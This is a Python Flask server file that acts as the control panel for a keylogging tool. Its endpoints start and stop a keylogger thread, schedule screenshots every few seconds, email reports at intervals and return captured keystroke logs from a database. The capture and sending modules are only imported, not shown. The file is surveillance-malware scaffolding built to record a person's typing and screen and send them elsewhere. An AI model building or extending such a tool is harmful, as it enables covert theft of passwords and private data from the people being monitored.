from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import schedule
import time
import os
from dotenv import load_dotenv
import db
from modules.keylogger import Keylogger
from modules.screenshot import capture_screenshot
from modules.email_sender import send_report

# Load environment variables
load_dotenv()

app = Flask(__name__)
CORS(app)  # Enable CORS for frontend communication

# Initialize keylogger
keylogger = Keylogger()

# Global monitoring status
monitoring_active = False

@app.route("/start_monitoring", methods=["POST"])
def start_monitoring():
    """Start keylogging, screenshots, and report generation."""
    global monitoring_active
    if monitoring_active:
        return jsonify({"status": "already running"}), 400

    monitoring_active = True

    # Start keylogger
    keylogger_thread = threading.Thread(target=keylogger.start)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    # Schedule screenshot capture
    schedule.every(int(os.getenv("SHOT_TIME", 30))).seconds.do(capture_screenshot)

    # Schedule report sending
    schedule.every(int(os.getenv("REPORT_INT", 60))).seconds.do(send_report)

    return jsonify({"status": "monitoring started"}), 200

@app.route("/stop_monitoring", methods=["POST"])
def stop_monitoring():
    """Stop keylogging, screenshots, and reports."""
    global monitoring_active
    if not monitoring_active:
        return jsonify({"status": "already stopped"}), 400

    monitoring_active = False
    schedule.clear()  # Stop all scheduled tasks

    return jsonify({"status": "monitoring stopped"}), 200

@app.route("/logs", methods=["GET"])
def get_logs():
    """Retrieve keylogs from database."""
    logs = db.get_logs()
    return jsonify({"logs": logs})

if __name__ == "__main__":
    app.run(debug=True)
